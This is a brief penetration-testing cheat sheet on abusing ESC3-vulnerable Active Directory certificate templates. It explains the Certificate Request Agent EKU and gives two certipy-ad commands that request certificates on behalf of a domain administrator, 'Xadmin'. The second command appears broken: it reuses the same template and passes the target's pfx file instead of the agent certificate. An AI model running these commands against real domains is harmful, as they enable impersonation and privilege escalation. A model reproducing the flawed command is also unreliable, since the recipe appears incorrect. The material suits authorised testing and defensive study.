# General Overview

An ESC3 vulnerable template permits the issuance of certificates on behalf of any user, enabling the potential impersonation of other users. This vulnerability arises because the template includes the Certificate Request Agent EKU. Specifically, the Certificate Request Agent OID (1.3.6.1.4.1.311.20.2.1) grants the ability to request certificates on behalf of other principals.

To exploit this misconfiguration, the Certificate Authority (CA) must have at least two templates that meet the following conditions:

1. The template allows a low-privileged user to enroll in an enrollment agent certificate.
2. The Approval Manager is disabled.
3. Authorized signatures are not required.
4. The certificate template defines the Certificate Request Agent EKU, enabling the request of other certificate templates on behalf of other principals.

# Abusing ESC3 Certificates

## Certipy:
- `certipy-ad req -u "afsimmons@megacorpone.com" -p "$PASSWORD" -dc-ip "$DC_IP" -target "$ADCS_HOST" -ca 'ca_name' -template 'vulnerable template' 
- `certipy-ad req -u "afsimmons@megacorpone.com" -p "$PASSWORD" -dc-ip "$DC_IP" -target "$ADCS_HOST" -ca 'ca_name' -template 'vulnerable template'  -on-behalf-of 'Megacorpone\Xadmin' -pfx 'xadmin.pfx'